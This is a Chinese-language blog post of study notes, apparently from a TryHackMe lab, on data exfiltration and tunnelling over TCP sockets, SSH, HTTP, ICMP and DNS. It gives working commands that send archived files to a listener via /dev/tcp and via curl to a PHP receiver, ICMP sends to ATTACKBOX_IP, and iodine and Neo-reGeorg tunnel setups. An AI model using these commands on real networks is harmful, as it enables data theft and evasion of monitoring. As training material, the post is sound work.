# Data Exfiltration

前面几章之前就已经顺手学过了，就不做笔记了，来看看有意思数据外泄

---

网络犯罪分子出于不同的目的对公司使用各种互联网攻击。在大多数情况下，其中许多攻击都以数据泄露告终，威胁行为者窃取敏感数据以在暗网上出售或在线发布。

有人可能会问：威胁行为者如何在不被发现的情况下将被盗数据从公司的网络传输到外部，也称为数据泄露？答案各不相同。威胁参与者可以执行许多技术，包括数据泄露。

数据泄露是一种非传统方法，用于将数据从受感染的计算机复制和传输到攻击者的计算机。数据泄露技术用于模拟正常的网络活动，它依赖于DNS，HTTP，SSH等网络协议。 通过通用协议进行的数据泄露很难检测和区分合法流量和恶意流量。

某些协议并非旨在通过它们传输数据。但是，威胁参与者会找到滥用这些协议来绕过基于网络的安全产品（如防火墙）的方法。使用这些技术作为红队员对于避免被发现至关重要。

## 网络拓扑

![在这里插入图片描述](https://img-blog.csdnimg.cn/05e1f66d2033410c94c30502932daf0a.png)

---

**数据泄露有三种主要用例场景，包括：**

- 泄露数据
- C2通信。
- 隧道

---

## TCP套接字

使用 TCP 套接字是攻击者可能在非安全环境中使用的数据泄露技术之一，在该环境中，他们知道没有基于网络的安全产品。 如果我们处于安全的环境中，则不建议进行这种渗透。 这种渗透类型很容易检测，因为我们依赖于非标准协议。

![在这里插入图片描述](https://img-blog.csdnimg.cn/e59918fee2144bd7b62cf18d9bc79138.png)

发送数据

```bash
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
```

恢复数据

```bash
nc -vlnp 8080 > task4-creds.data
thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
```

## SSH

ssh不用多介绍了，老熟人了，什么scp或者直接ssh执行命令

```bash
thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

## HTTP / HTTPS

**作为此技术的要求，攻击者需要控制已安装并启用了服务器端编程语言的 Web 服务器。**

**通过 HTTP 协议的渗透数据是最佳选择之一，因为它很难检测。很难区分合法和恶意的HTTP流量。**

我们将在数据泄露中使用 POST HTTP 方法，原因是使用 GET 请求，所有参数都注册到日志文件中。使用 POST 请求时，它不会。以下是 POST 方法的一些优点：

- 从不缓存 POST 请求
- POST 请求不会保留在浏览器历史记录中
- 无法为 POST 请求添加书签
- POST 请求对数据长度没有限制

### 数据外泄

要通过 HTTP 协议泄露数据，我们可以应用以下步骤：

1) 攻击者使用数据处理程序设置 Web 服务器。在我们的例子中，它将 web.thm.com 和联系人.php页面作为数据处理程序。
2) C2 代理或攻击者发送数据。在我们的例子中，我们将使用 curl 命令发送数据。
3) 网络服务器接收数据并存储它。在我们的例子中，联系人.php接收 POST 请求并将其存储到 /tmp 中。
4) 攻击者登录到网络服务器以获取接收数据的副本。

```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

```bash
thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```

### HTTP 隧道

![在这里插入图片描述](https://img-blog.csdnimg.cn/8d99d92698184193a73a54cd2cc9a3fa.png)

我们将使用[Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)工具来建立一个通信通道来访问内部网络设备。

```bash
# 生成加密客户端
$ python3 neoreg.py generate -k thm
```

将适合的客户端文件上传到web服务器目录下，确保该文件能够执行

连接到客户端文件，建立隧道:

```bash
python3 neoreg.py -k thm -u http://10.10.109.43/uploader/files/tunnel.php
```

```bash
curl --socks5 127.0.0.1:1080 app.thm.com
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/f95e559c01694ece803c639b02f0bcab.png)

## ICMP

![在这里插入图片描述](https://img-blog.csdnimg.cn/5cbbc41ee8e340f6b0d5419fd76a2d0a.png)

**Linux 操作系统中的 ping 命令有一个有趣的 ICMP 选项。使用 -p 参数，我们可以以十六进制表示形式指定 16 个字节的数据以通过数据包发送。 请注意，-p 选项仅适用于 Linux 操作系统。**

```bash
echo "thm:tryhackme" | xxd -p 
ping xxxx -p <data>
```

### 数据外泄

让我们讨论如何使用 Metasploit 来泄露数据。Metasploit框架使用与上一节中解释的相同技术。但是，它将捕获传入的 ICMP 数据包并等待文件开头 （BOF） 触发器值。收到后，它会写入磁盘，直到获得文件结束 （EOF） 触发器值。

	auxiliary/server/icmp_exfil
	set BPF_FILTER icmp and not src ATTACKBOX_IP

nping --data-string 可以帮助快速发送数据

```bash
nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFxxxxx"
nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
```

### C2 通信

![在这里插入图片描述](https://img-blog.csdnimg.cn/a163d4e15fb94c3a9fb66333d5c9adee.png)

[ICMPDoor](https://github.com/krabelize/icmpdoor)是一个用Python3和scapy编写的开源反向shell

## DNS

**由于 DNS 不是传输协议，因此许多组织不会定期监控 DNS 协议！任何组织网络中的几乎所有防火墙都允许使用 DNS 协议。出于这些原因，威胁参与者更喜欢使用 DNS 协议来隐藏他们的通信。**

![在这里插入图片描述](https://img-blog.csdnimg.cn/9833e9bf8ee5403ab3c47118110db466.png)
### 数据外泄

1) 攻击者注册域名 tunnel.com
2) 攻击者设置隧道.com的 NS 记录指向攻击者控制的服务器。
3) 恶意软件或攻击者将敏感数据从受害计算机发送到他们控制的域名，例如 passw0rd.tunnel.com，其中 passw0rd 是需要传输的数据。
4) DNS 请求通过本地 DNS 服务器发送，并通过互联网转发。
5) 攻击者的权威 DNS（恶意服务器）接收 DNS 请求。
6) 最后，攻击者从域名中提取密码。

**有许多用例场景，但典型的场景是防火墙阻止并过滤所有流量。我们可以使用 DNS 协议通过防火墙传递数据或 TCP/UDP 数据包，但重要的是要确保允许 DNS 并将域名解析为 IP 地址。**

![在这里插入图片描述](https://img-blog.csdnimg.cn/a227d672f0fc4c77ad84b13bf4acf90f.png)

### C2通信

我们需要将脚本编码为 Base64 表示形式，然后使用编码脚本的内容创建您控制的域名的 TXT DNS 记录

![在这里插入图片描述](https://img-blog.csdnimg.cn/a5f1c2d1d2974f2c9895bac452d19b0d.png)

```bash
dig txt domain
```

### DNS 隧道

![在这里插入图片描述](https://img-blog.csdnimg.cn/682c8fb3dc4e4a3089f711f98eff8947.png)

**此技术也称为 DNS 上的 TCP，攻击者使用 DNS 数据泄露技术通过 DNS 协议封装其他协议，例如 HTTP 请求。DNS 隧道建立了一个通信通道，在该通道中连续发送和接收数据。**

我们将使用[iodine](https://github.com/yarrick/iodine)工具来创建我们的 DNS 隧道通信.

服务端（攻击机）

```bash
thm@attacker$ iodined -c -P thmpass 10.1.1.1/24 att.tunnel.com
```

- -f 参数用于在前台运行服务器。
- -c 参数是跳过检查每个 DNS 请求的客户端 IP 地址和端口。
- -P 参数用于设置用于身份验证的密码。
- 10.1.1.1/24 参数用于设置新网络接口 （dns0） 的网络 IP。服务器的 IP 地址为 10.1.1.1，客户端的 IP 地址为 10.1.1.2。
- att.tunnel.com 是我们之前设置的名称服务器。

客户端（跳板机）

```bash
thm@jump-box:~$ iodine -P thmpass att.tunnel.com
```

请注意，通过网络 10.1.1.1/24 进行的所有通信都将通过 DNS。我们将使用动态端口转发功能的 -D 参数来使用 SSH 会话作为代理。请注意，我们使用 -f 参数来强制 ssh 进入后台。-4 参数强制 ssh 客户端仅在 IPv4 上绑定。

攻击机

```bash
root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080
```

## 泄露真实例子

- SunTrust Bank 发生了一次内部数据泄露事件，在多达 1 万条客户敏感数据（包括姓名、地址、电话号码和帐户余额）被盗后，发现了离开网络的可疑流量。
- 特斯拉是内部人员数据泄露的受害者，这导致了数据泄露。2018年，一名员工向第三方泄露了千兆字节的机密照片和代码制造操作系统，包括其他个人和敏感数据。
- 通济隆是世界领先的货币兑换专家。2020 年，它是名为 Sodinokibi 的勒索软件的受害者。攻击者利用其中一个内部服务器的未修补漏洞。攻击者利用其中一台内部服务器中未修补的漏洞，允许他们使用其中一种渗透技术将敏感数据泄露出组织的网络。敏感数据包括个人身份信息 （PII） 和财务信息。